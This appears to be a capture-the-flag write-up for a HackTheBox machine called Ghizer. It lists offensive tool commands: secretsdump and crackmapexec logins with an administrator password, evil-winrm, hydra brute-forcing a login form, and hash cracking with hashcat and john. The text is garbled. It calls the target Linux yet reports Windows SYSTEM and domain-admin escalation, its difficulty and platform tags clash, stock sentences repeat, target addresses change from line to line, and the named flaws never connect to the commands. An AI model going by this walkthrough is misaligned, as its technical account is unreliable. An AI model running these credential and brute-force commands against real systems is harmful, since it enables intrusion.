---
TitleSEO: "HackTheBox — Ghizer (Medium Linux) | ZureFX"
TitlePost: "HackTheBox — Ghizer (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Ghizer. Local File Inclusion and CORS Misconfiguration to achieve medium compromise on Linux."
Keywords: "pwntilldawn, ctf, easy, web"
URL: "https://zurefx.github.io/writeups/htb-ghizer-339.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ghizer-339/"
Date: "2025-09-07"
Tags: "PwnTillDawn, CTF, Easy, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-ghizer-339"
Permalink: "/writeups/htb-ghizer-339.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ghizer** is rated **Medium** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.91.168.212`.

### Objectives

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.124.124
gobuster dir -u http://10.64.31.122/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.162.119/FUZZ
evil-winrm -i 10.122.102.77 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

### Web Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
feroxbuster -h
crackmapexec smb 10.56.55.153 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.93.170.146 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

Key finding: **CORS Misconfiguration**.

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.29.158.160/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p5985,21,3389 10.91.40.253 -oN scan.txt
gobuster dir -u http://10.29.165.250/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.41.247.79/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.121.93.83 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.68.229.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `gobuster`
- `hashcat`
- `mimikatz`
- `psexec`

### Key Takeaways

- Local File Inclusion
- CORS Misconfiguration
- LAPS Abuse
- CSRF
